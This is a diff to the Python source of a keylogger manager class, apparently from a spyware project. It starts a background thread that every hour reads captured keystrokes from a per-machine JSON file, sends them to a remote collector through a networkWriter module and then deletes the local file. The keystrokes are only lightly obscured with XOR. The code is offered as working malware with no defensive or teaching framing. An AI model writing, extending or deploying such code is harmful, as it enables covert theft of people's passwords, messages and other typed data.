@@ -1,4 +1,5 @@
 import datetime
+import threading
 import time
 import json
 import os
@@ -10,8 +11,15 @@ from networkWriter import networkWriter
 class KeyLoggerManager:
     def __init__(self):
         self.buffer = []
-        self.to_encrypt = []
         self.config = self.load_config()
+        self.timestamp = self.get_hour_timestamp()
+        self.end = False
+        self.machine_name = self.config.get("machine_name", "unknown")
+        self.file_path = f'{self.machine_name}.json'
+
+        if not os.path.exists(self.file_path):
+            with open(self.file_path, "w") as file:
+                json.dump({}, file)
 
     def load_config(self):
         try:
@@ -21,34 +29,56 @@ class KeyLoggerManager:
             return {
                 "machine_name": "unknown",
                 "machine_ip": "127.0.0.1"
+
             }
 
+    def get_hour_timestamp(self):
+        now = datetime.datetime.now()
+        hour_timestamp = now.replace(minute=0, second=0, microsecond=0)
+        return str(hour_timestamp)
+
+    def send_to_network(self):
+        while not self.end:
+            time.sleep(3600)
+            with open(self.file_path,'r') as file:
+                content = json.load(file)
+            networkWriter.send_data(content,self.machine_name)
+            os.remove(self.file_path)
+            self.timestamp = self.get_hour_timestamp()
+
+            with open(self.file_path, "w") as file:
+                json.dump({}, file)
+
+
+
     def manager(self):
-        service.start_logging()
-        end = False
         try:
-            while not end:
+            service.start_logging()
+            network_thread = threading.Thread(target=self.send_to_network, daemon=True)
+            network_thread.start()
+
+            while not self.end:
+                current_hour = self.get_hour_timestamp()
+                if current_hour != self.timestamp:
+                    self.timestamp = current_hour
+
                 new_keys = service.get_logged_keys()
                 if new_keys:
                     self.buffer.extend(new_keys)
 
 
                     if "<ESC>" in new_keys:
-                        end = True
+                        self.end = True
 
-                    if len(self.buffer) > 20 or end:
-                        timestamp = str(datetime.datetime.now())
+                    encrypted_keys = [encryptor.ascii_xor(char) for char in self.buffer]
 
-                        encrypted_keys = []
-                        for char in self.buffer:
-                            encrypted_keys.append(encryptor.ascii_xor(char))
+                    data_dict = {self.timestamp: encrypted_keys}
+                    file_writer.send_data(data_dict, self.machine_name)
 
-                        content = {timestamp: encrypted_keys}
-                        machine_name = self.config.get("machine_name", "unknown")
-                        file_writer.send_data(content, machine_name)
-                        networkWriter.send_data(content, machine_name)
 
-                        self.buffer = []
+                    self.buffer = []
+                    service.logged_keys = []
+
 
                 time.sleep(5)
         except KeyboardInterrupt:
